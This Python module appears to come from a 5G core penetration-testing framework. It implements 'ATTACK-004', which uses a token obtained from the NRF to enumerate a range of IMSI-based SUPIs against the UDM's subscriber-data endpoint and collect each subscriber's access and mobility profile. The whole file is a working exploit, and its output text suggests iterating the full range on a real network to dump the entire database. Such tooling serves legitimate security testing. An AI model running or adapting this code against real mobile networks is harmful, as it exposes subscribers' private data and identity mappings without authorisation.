from attacks.base_attack import BaseAttack, AttackResult
from core import http_client, token_manager
from config import UDM_URL, MCC, MNC, SUPI_START, SUPI_END

class UDMSubscriberDumpAttack(BaseAttack):
    attack_id = "ATTACK-004"
    name = "UDM Full Subscriber Dump"
    affected_nf = "UDM"
    endpoint = "GET /nudm-sdm/v2/{supi}/am-data"

    def run(self) -> AttackResult:
        token = token_manager.get_token("UDM", "nudm-sdm")

        if not token:
            return self.result(
                success=False,
                data={},
                evidence="Could not obtain token from NRF",
                conclusion="Token request failed — run ATTACK-002 first."
            )

        extracted = {}
        failed = []
        params = {"plmn-id": f'{{"mcc":"{MCC}","mnc":"{MNC}"}}'}

        for i in range(SUPI_START, SUPI_END + 1):
            supi = f"imsi-{MCC}{MNC}{str(i).zfill(10)}"
            url = f"{UDM_URL}/nudm-sdm/v2/{supi}/am-data"

            try:
                resp = http_client.get(url, token=token, params=params)

                if resp.status_code == 200:
                    extracted[supi] = resp.json()
                elif resp.status_code == 404:
                    failed.append(supi)
                elif resp.status_code == 403:
                    return self.result(
                        success=False,
                        data={},
                        evidence=f"UDM returned 403 on {supi}",
                        conclusion="UDM enforces per-subscriber authorization — attack blocked."
                    )
            except Exception as e:
                failed.append(supi)

        if extracted:
            return self.result(
                success=True,
                data={
                    "extracted_count": len(extracted),
                    "failed_count": len(failed),
                    "subscribers": extracted
                },
                evidence=f"Extracted {len(extracted)} subscriber profiles from UDM. "
                         f"{len(failed)} SUPIs returned 404 (not registered).",
                conclusion=f"Full subscriber data extracted for {len(extracted)} subscribers. "
                           f"Data includes: speed limits, slice assignments, GPSI mappings. "
                           f"In a real network, iterate full SUPI range to dump entire database."
            )
        else:
            return self.result(
                success=False,
                data={"failed": failed},
                evidence="No subscriber data found in tested SUPI range",
                conclusion="No subscribers found — add subscribers to UDM and retry."
            )